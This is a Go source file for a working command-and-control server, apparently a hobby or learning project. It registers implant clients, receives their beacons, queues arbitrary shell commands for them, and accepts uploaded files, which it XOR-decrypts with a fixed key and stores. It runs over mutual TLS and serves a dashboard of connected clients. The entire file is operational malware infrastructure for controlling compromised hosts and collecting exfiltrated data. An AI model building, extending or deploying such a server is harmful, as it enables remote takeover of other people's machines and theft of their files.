package main

import (
	"bytes"
	"crypto/tls"
	"crypto/x509"
	"fmt"
	"html/template"
	"io"
	"log"
	"net/http"
	"os"
	"sync"
	"time"
)

type Client struct {
	ID       string
	LastSeen time.Time
	Command  string
	Duration int
}

var (
	clients     map[string]*Client
	clientsLock sync.Mutex
)

func init() {
	clients = make(map[string]*Client)
}

var encyptionKey byte = 0xA1

func encrypt(plainText string) []byte {
	cipherText := make([]byte, len(plainText))

	for i := 0; i < len(plainText); i++ {
		c := plainText[i]
		cipherText[i] = c ^ encyptionKey
	}

	return cipherText
}

func decrypt(cipherText []byte) string {
	plainText := make([]byte, len(cipherText))

	for i := 0; i < len(cipherText); i++ {
		c := cipherText[i]
		plainText[i] = c ^ encyptionKey
	}

	decryptedStr := ""
	for _, b := range plainText {
		decryptedStr += string(rune(b))
	}

	return decryptedStr
}

func registerHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	clients[clientID] = &Client{ID: clientID, LastSeen: time.Now()}
	fmt.Printf("Client registered: %s\n", clientID)
	fmt.Fprintf(w, "Client registered: %s", clientID)
}

func beaconHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	beaconTime := r.URL.Query().Get("time")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	if client, exists := clients[clientID]; exists {
		client.LastSeen = time.Now()
		fmt.Printf("Beacon received from client %s at %s\n", clientID, beaconTime)
		fmt.Fprintf(w, "Beacon received from client %s", clientID)
	} else {
		http.Error(w, "Client not found", http.StatusNotFound)
	}
}

func commandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	command := r.URL.Query().Get("cmd")

	if clientID == "" || command == "" {
		http.Error(w, "Client ID or Command not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	client, exists := clients[clientID]
	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	if command == "sleep" {
		duration := r.URL.Query().Get("duration")
		if duration == "" {
			http.Error(w, "Duration not provided for sleep command", http.StatusBadRequest)
			return
		}
		client.Command = fmt.Sprintf("sleep %s", duration)
		fmt.Printf("Client %s instructed to sleep for %s seconds\n", clientID, duration)
	} else {
		client.Command = command
	}

	fmt.Printf("Command '%s' sent to client %s\n", command, clientID)
	fmt.Fprintf(w, "Command '%s' sent to client %s", command, clientID)
}

func getCommandHandler(w http.ResponseWriter, r *http.Request) {
	clientID := r.URL.Query().Get("id")
	if clientID == "" {
		http.Error(w, "Client ID not provided", http.StatusBadRequest)
		return
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	client, exists := clients[clientID]
	if !exists {
		http.Error(w, "Client not found", http.StatusNotFound)
		return
	}

	fmt.Fprintf(w, client.Command)

	client.Command = "" // Clear the command after sending it
}

type ClientView struct {
	ID       string
	LastSeen string
}

func homeHandler(w http.ResponseWriter, r *http.Request) {
	type ViewData struct {
		Clients []ClientView
	}

	clientsLock.Lock()
	defer clientsLock.Unlock()

	var clientViews []ClientView
	for _, client := range clients {
		clientViews = append(clientViews, ClientView{
			ID:       client.ID,
			LastSeen: client.LastSeen.Format(time.RFC3339),
		})
	}

	data := ViewData{
		Clients: clientViews,
	}

	templ := template.Must(template.ParseFiles("server.html"))
	templ.Execute(w, data)
}

// https://stackoverflow.com/questions/44173461/copy-a-file-from-client-to-server-via-rest-end-point-using-golang
func uploadHandler(w http.ResponseWriter, r *http.Request) {
	// Parse form
	fmt.Printf("Upload request", r)

	// Get clientID from query parameter or form data
	clientID := r.FormValue("id")
	if clientID == "" {
		http.Error(w, "Missing clientID", http.StatusBadRequest)
		return
	}

	// Retrieve the uploaded file
	file, handler, err := r.FormFile("file")
	if err != nil {
		http.Error(w, "Unable to retrieve file", http.StatusBadRequest)
		return
	}
	defer file.Close()

	var buf bytes.Buffer
	_, err = io.Copy(&buf, file)
	if err != nil {
		log.Printf("Failed to read file: %v", err)
		http.Error(w, "Failed to read file", http.StatusInternalServerError)
		return
	}

	decryptedContent := decrypt(buf.Bytes())

	// Create a local file to store the uploaded content
	fileName := fmt.Sprintf("uploaded_%s_%s", clientID, handler.Filename)
	f, err := os.OpenFile(fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0666)
	if err != nil {
		log.Printf("Failed to create file: %v", err)
		http.Error(w, "Failed to create file", http.StatusInternalServerError)
		return
	}
	defer f.Close()

	// Copy the uploaded file to the local file
	_, err = f.Write([]byte(decryptedContent))
	if err != nil {
		log.Printf("Failed to save file: %v", err)
		http.Error(w, "Failed to save file", http.StatusInternalServerError)
		return
	}

	log.Printf("File uploaded successfully: %s", fileName)
	fmt.Fprintf(w, "File uploaded successfully\n")
}

//https://www.youtube.com/watch?v=VF7lof3bSfE

func main() {
	mux := http.NewServeMux()
	mux.HandleFunc("/register", registerHandler)
	mux.HandleFunc("/beacon", beaconHandler)
	mux.HandleFunc("/command", commandHandler)
	mux.HandleFunc("/getCommand", getCommandHandler)
	mux.HandleFunc("/upload", uploadHandler)
	mux.HandleFunc("/", homeHandler)

	certFile := "server.crt"
	keyFile := "server.key"
	caCertPath := "ca.crt"

	caCert, err := os.ReadFile(caCertPath)
	if err != nil {
		log.Println(err)
		return
	}
	caCertPool := x509.NewCertPool()
	caCertPool.AppendCertsFromPEM(caCert)

	cfg := &tls.Config{
		ClientAuth: tls.RequireAndVerifyClientCert,
		ClientCAs:  caCertPool,
		MinVersion: tls.VersionTLS12,
		MaxVersion: tls.VersionTLS12,
	}
	srv := &http.Server{
		Addr:      ":8443",
		Handler:   mux,
		TLSConfig: cfg,
	}

	fmt.Println("C&C server listening on :8443...")
	log.Fatal(srv.ListenAndServeTLS(certFile, keyFile))
}
